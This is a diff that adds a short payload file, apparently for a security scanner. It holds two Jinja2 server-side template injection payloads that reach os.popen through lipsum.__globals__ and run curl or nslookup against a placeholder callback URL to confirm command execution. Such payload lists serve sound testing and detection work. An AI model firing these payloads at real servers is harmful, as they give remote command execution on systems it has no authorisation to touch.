@@ -1,0 +1,4 @@
+# Jinja2 SSTI payloads - Python template engine (Flask, Django)
+# {{CALLBACK}} replaced with callback URL
+{{ lipsum.__globals__["os"].popen("curl {{CALLBACK}}").read() }}
+{{ lipsum.__globals__["os"].popen("nslookup {{CALLBACK}}").read() }}
